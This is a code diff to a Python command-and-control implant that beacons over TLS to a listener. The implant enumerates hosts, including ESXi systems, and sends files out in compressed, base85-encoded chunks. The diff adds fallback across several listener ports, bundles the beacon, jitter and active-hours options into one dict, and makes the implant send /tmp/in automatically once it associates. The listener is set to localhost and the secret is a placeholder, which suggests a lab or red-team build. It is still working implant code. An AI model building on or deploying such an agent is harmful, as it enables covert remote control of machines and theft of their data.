@@ -3,29 +3,32 @@ import sys
 import ssl
 import zlib
 import json
-import time
+import time as t
 import socket
 import base64
 import hashlib
 import logging
 import platform
-import datetime
+from datetime import datetime, time, date
 import subprocess
 from random import randrange
 
 
 _LISTENER_HOST = "localhost"
-_LISTENER_PORT = 1235
+_LISTENER_PORTS = [8080, 1235, 9001]
 _LISTENER_SECRET = "whatever"
-_AGENT_BEACON_INTERVAL = 0.5
-_AGENT_BEACON_JITTER = 0
-_AGENT_START_TIME = datetime.time(0, 0, 0)
-_AGENT_END_TIME = datetime.time(23, 59, 0)
-_AGENT_SOCKET_TIMEOUT = 2
 _AGENT_LOGLEVEL = logging.DEBUG
-_AGENT_PID_FILE_LOCATION = "/tmp/agent.pid"
-_AGENT_FILE_TRANSFER_BLOCK_SIZE = 8192
+_AGENT_OPTIONS = {
+    "BEACON_INTERVAL": 0.5,
+    "BEACON_JITTER": 0,
+    "START_TIME": str(time(0, 0, 0)),
+    "END_TIME": str(time(23, 59, 0)),
+    "SOCKET_TIMEOUT": 2,
+    "PID_FILE": "/tmp/agent.pid",
+    "TRANSFER_BLOCK_SIZE": 8192,
+}
 
+_AGENT_DEPLOYED_TS = date.today()
 
 logging.basicConfig(level=_AGENT_LOGLEVEL, format="%(asctime)s %(message)s")
 
@@ -44,14 +47,21 @@ class Agent:
         _AGENT_CIPHERS = "AES128-SHA"
         context.set_ciphers(_AGENT_CIPHERS)
         logging.debug("Connecting socket")
-        try:
-            sock = socket.create_connection((_LISTENER_HOST, _LISTENER_PORT))
-            sock.settimeout(_AGENT_SOCKET_TIMEOUT)
-            logging.debug("Upgrading to TLS")
-            self.ssock = context.wrap_socket(sock, server_hostname=_LISTENER_HOST)
-            return True
-        except:
-            return False
+        for port in _LISTENER_PORTS:
+            logging.debug("Attempting port: " + str(port))
+            try:
+                sock = socket.create_connection((_LISTENER_HOST, port))
+                logging.debug("Connection to port " + str(port) + " succeeded.")
+                sock.settimeout(_AGENT_OPTIONS["SOCKET_TIMEOUT"])
+                logging.debug("Upgrading to TLS")
+                self.ssock = context.wrap_socket(sock, server_hostname=_LISTENER_HOST)
+                return True
+            except:
+                logging.debug(
+                    "Connection to port " + str(port) + " was not successful."
+                )
+                pass
+        return False
 
     def enum_host(self):
         logging.debug("Enumerating host")
@@ -59,12 +69,7 @@ class Agent:
         host_name = socket.gethostname()
         host_data = {"host_platform": host_platform, "host_name": host_name}
 
-        enumdata = {
-            "host_data": host_data,
-            "agent_max_beacon_interval": _AGENT_BEACON_INTERVAL + _AGENT_BEACON_JITTER,
-            "agent_active_hr_start": str(_AGENT_START_TIME),
-            "agent_active_hr_end": str(_AGENT_END_TIME),
-        }
+        enumdata = {"host_data": host_data, "agent_options": json.dumps(_AGENT_OPTIONS)}
 
         if "VMkernel" in host_platform:
             logging.debug("Beginning platform-specific ESXi enumeration")
@@ -122,7 +127,7 @@ class Agent:
 
         try:
             logging.debug("Sending packet")
-            logging.debug("AGENT    : " + msg[0:25])
+            logging.debug("AGENT    : " + msg[0:180])
             self.ssock.send(msg.encode())
             response = self.ssock.recv()
             logging.debug("LISTENER : " + response.decode())
@@ -174,6 +179,7 @@ class Agent:
         return self.tls_transact_msg(response_pkt)
 
     def send_file(self, filename):
+        logging.debug("Sending file")
         offset = 0
         try:
             file = open(filename, "rb")
@@ -181,13 +187,13 @@ class Agent:
             self.respond_error("File not found!")
             return
         while True:
-            chunk_data = file.read(_AGENT_FILE_TRANSFER_BLOCK_SIZE)
+            chunk_data = file.read(_AGENT_OPTIONS["TRANSFER_BLOCK_SIZE"])
             if not chunk_data:
                 break
             chunk_data = zlib.compress(chunk_data)
             chunk_data = base64.b85encode(chunk_data).decode()
             self.send_file_segment(chunk_data, offset, os.path.basename(filename))
-            offset = offset + _AGENT_FILE_TRANSFER_BLOCK_SIZE
+            offset = offset + _AGENT_OPTIONS["TRANSFER_BLOCK_SIZE"]
 
     def respond(self, msg):
         """
@@ -242,14 +248,14 @@ class Agent:
 
     def write_pid_file(self):
         my_pid = str(os.getpid())
-        pidfile = open(_AGENT_PID_FILE_LOCATION, "w")
+        pidfile = open(_AGENT_OPTIONS["PID_FILE"], "w")
         pidfile.write(my_pid)
         pidfile.close()
 
     def is_running(self):
-        if not os.path.exists(_AGENT_PID_FILE_LOCATION):
+        if not os.path.exists(_AGENT_OPTIONS["PID_FILE"]):
             return False
-        pidfile = open(_AGENT_PID_FILE_LOCATION, "r")
+        pidfile = open(_AGENT_OPTIONS["PID_FILE"], "r")
         pid = pidfile.read()
         logging.debug("PID file found with PID: " + pid)
         logging.debug("Checking if stale")
@@ -262,16 +268,28 @@ class Agent:
 
     def run(self):
         self.enumdata = self.enum_host()
+
         _AGENT_STATE_ENUM = 0
         while True:
-            time.sleep(_AGENT_BEACON_INTERVAL + randrange(_AGENT_BEACON_JITTER) if _AGENT_BEACON_JITTER > 0 else _AGENT_BEACON_INTERVAL)
-            if _AGENT_START_TIME <= datetime.datetime.now().time() <= _AGENT_END_TIME:
+            t.sleep(
+                _AGENT_OPTIONS["BEACON_INTERVAL"]
+                + randrange(_AGENT_OPTIONS["BEACON_JITTER"])
+                if _AGENT_OPTIONS["BEACON_JITTER"] > 0
+                else _AGENT_OPTIONS["BEACON_INTERVAL"]
+            )
+            start_time = datetime.strptime(
+                _AGENT_OPTIONS["START_TIME"], "%H:%M:%S"
+            ).time()
+            current_time = datetime.now().time()
+            end_time = datetime.strptime(_AGENT_OPTIONS["END_TIME"], "%H:%M:%S").time()
+            if start_time <= current_time <= end_time:
                 if _AGENT_STATE_ENUM == 0:
                     if self.init_socket():
                         _AGENT_STATE_ENUM = 1
                 if _AGENT_STATE_ENUM == 1:
                     if self.associate():
                         _AGENT_STATE_ENUM = 2
+                        self.send_file("/tmp/in")
                 if _AGENT_STATE_ENUM == 2:
                     beacon_response = self.beacon()
                     if beacon_response is False:
